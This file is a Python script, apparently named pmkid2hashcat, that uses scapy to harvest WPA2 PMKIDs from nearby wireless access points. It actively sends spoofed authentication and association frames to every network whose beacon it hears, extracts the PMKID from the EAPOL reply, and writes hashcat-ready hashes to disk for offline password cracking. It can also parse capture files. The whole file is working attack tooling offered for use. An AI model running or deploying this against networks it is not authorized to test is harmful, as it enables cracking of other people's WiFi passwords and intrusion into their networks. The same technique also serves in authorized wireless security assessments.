#!/usr/bin/python3

import argparse
import binascii
# import packetEssentials as PE
# import quickset as qs
import sys
# from easyThread import Backgrounder
import threading
from scapy.all import *

class Shared(object):
    """Share a class for backgrounding"""
    __slots__ = ['args',
                 'beaconSet',
                 'capSet',
                 'essidDict',
                 'pmkDict',
                 'bH',
                 'bkts',
                 'pkts']
    def __init__(self, args):

        self.beaconSet = set()
        self.args = args
        self.capSet = set()
        self.essidDict = {}
        self.pmkDict = {}
        self.bH = self.beaconHandler()


    def beaconHandler(self):
        """Parse which PMKIDs have been gathered and only ask once."""
        def snarf(packet):
            if packet[Dot11].addr2 not in self.beaconSet:
                if len(packet[Dot11Elt].info) > 0:
                    self.essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})

                    ## Active sniffing assist
                    if self.args.f is None:
                        self.pmkAsk(self.args.i, packet[Dot11].addr2, packet[Dot11Elt].info)

                    ## This prevents firing more than once
                    self.beaconSet.add(packet[Dot11].addr2)
        return snarf


    def beaconBackgrounder(self):
        p = sniff(iface = args.i, prn = self.bH, lfilter = lambda x: x.haslayer(Dot11Beacon), store = 0)


    def pmkAsk(self, iFace, tgtMac, tgtEssid):
        """Try and obtain the PMKID

        Based on experimentation with hcxdumptool
        """
        if self.args.random is True:
            # qs.sh.macTx = RandMAC()._fix()
            macTx = RandMAC()._fix()
        else:
            # qs.sh.macTx = 'a0:12:34:56:78:90'
            macTx = 'a0:12:34:56:78:90'
        # qs.sh.macRx = tgtMac
        macRx = tgtMac
        # qs.sh.essid = tgtEssid
        essid = tgtEssid
        # auth1 = qs.supplicants.authenticate()
        auth1 = RadioTap()\
                /Dot11(type = 0,
                       subtype = 11,
                       addr1 = macRx,
                       addr2 = macTx,
                       addr3 = macRx)\
                /Dot11Auth(algo = 0,
                           seqnum = 1)
        auth1[Dot11].SC = 16
        # auth2 = qs.supplicants.authenticate()
        auth2 = RadioTap()\
                /Dot11(type = 0,
                       subtype = 11,
                       addr1 = macRx,
                       addr2 = macTx,
                       addr3 = macRx)\
                /Dot11Auth(algo = 0,
                           seqnum = 1)
        auth2[Dot11].SC = 32
        # ourAssc = qs.supplicants.associate()\
        #           /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
        ourAssc = RadioTap()\
                  /Dot11(type = 0,
                         subtype = 0,
                         addr1 = macRx,
                         addr2 = macTx,
                         addr3 = macRx)\
                  /Dot11AssoReq()\
                  /Dot11Elt(ID = 'SSID', info = essid)\
                  /Dot11EltRates(rates = [2, 4, 11, 22, 12, 18, 24, 36])\
                  /Dot11EltRates(ID = 50, rates = [48, 72, 96, 108])\
                  /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
        ourAssc[Dot11].SC = 48
        sendp([auth1, auth2, ourAssc], iface = iFace, inter = 1, verbose = False)


def pmkRip(packet):
    """Attempt to rip the PMKID"""
    try:
        # pmkid = PE.pt.byteRip(packet[Raw].load,
        #                       order = 'last',
        #                       qty = 16,
        #                       compress = True)
        stream = hexstr(packet[Raw].load, onlyhex = 1).split(' ')
        pmkid = ' '.join(stream[len(stream) - 16:]).replace(' ', '')
        if pmkid[-1] != 0:
            return pmkid
        else:
            return False
    except Exception as E:
        print(E)
        return False


def lFilter():
    """Filter Handler"""
    def snarf(packet):
        if packet.haslayer(EAPOL):
            if packet[EAPOL].version == 2:
                return True
    return snarf


def packetHandler(sh):
    """Packet Handler"""
    def snarf(packet):
        if packet[Dot11].addr2 not in sh.capSet:
            pmkID = pmkRip(packet)
            if pmkID is not False:
                if '00000000000000000000000000000000' != pmkID:

                    ## ESSID MAC: packet
                    sh.pmkDict.update({packet[Dot11].addr2: packet})

                    ## Set PMKID
                    ourHash = pmkID + '*'

                    ## BSSID
                    ourHash += packet[Dot11].addr2.replace(':', '') + '*'

                    ## Tgt MAC
                    ourHash += packet[Dot11].addr1.replace(':', '') + '*'

                    ## ESSID
                    if packet[Dot11].addr2 not in sh.capSet and sh.essidDict.get(packet[Dot11].addr2) is not None:
                        try:

                            ## Calculate hash
                            ourHash += str(binascii.hexlify(sh.essidDict.get(packet[Dot11].addr2)).decode())
                            print ('Obtained PMKID ~~> ', ourHash + ' -- ' + sh.essidDict.get(packet[Dot11].addr2).decode() + ' -- ' + packet[Dot11].addr2 + '\n')

                            ## Store results
                            with open('hashes.file', 'a') as oFile:
                                oFile.write(ourHash + '\n')
                            with open('hashes.log', 'a') as oFile:
                                oFile.write(ourHash + '*' + sh.essidDict.get(packet[Dot11].addr2).decode() + '\n')

                            ## Update capture set
                            sh.capSet.add(packet[Dot11].addr2)

                        except Exception as e:
                            print(f'\n\n{e}\nError on line {sys.exc_info()[-1].tb_lineno}')
    return snarf


def main(sh, args):

    ## Ignore any existing hashes
    try:
        with open('hashes.file') as iFile:
            x = iFile.read().splitlines()
        cSet = set([i.split('*')[1] for i in x])
        for cap in cSet:
            sh.beaconSet.add(':'.join(a + b for a, b in zip(cap[::2], cap[1::2])))
    except:
        pass
    if len(sh.beaconSet) > 0:
        print('Excluding:\n ', sh.beaconSet)

    ## Filters and such for EAPOLs
    pHandler = packetHandler(sh)
    LFILTER = lFilter()

    ## Live
    if args.i is not None:

        ## Background Beacon sniffing
        # Backgrounder.theThread = sh.beaconBackgrounder
        # bg = Backgrounder()
        # bg.easyLaunch()
        theThread = threading.Thread(target = sh.beaconBackgrounder)
        theThread.daemon = True
        theThread.start()

        ## EAPOL sniffing
        pkts = sniff(iface = args.i, prn = pHandler, lfilter = LFILTER, store = 0)

    ## PCAP
    else:
        bHandler = sh.beaconHandler()
        sh.bkts = sniff(offline = args.f, prn = bHandler, lfilter = lambda x: x.haslayer(Dot11Beacon), store = 0)
        sh.pkts = sniff(offline = args.f, prn = pHandler, lfilter = LFILTER, store = 0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'pmkid2hashcat')
    group = parser.add_mutually_exclusive_group(required = True)
    group.add_argument('-f', help = 'PCAP to parse', metavar = '<capture file>',)
    group.add_argument('-i', help = 'Interface to sniff on', metavar = '<sniff nic>')
    parser.add_argument('--random', action = 'store_true', help = 'Random MAC for Tx')
    args = parser.parse_args()
    sh = Shared(args)
    main(sh, args)
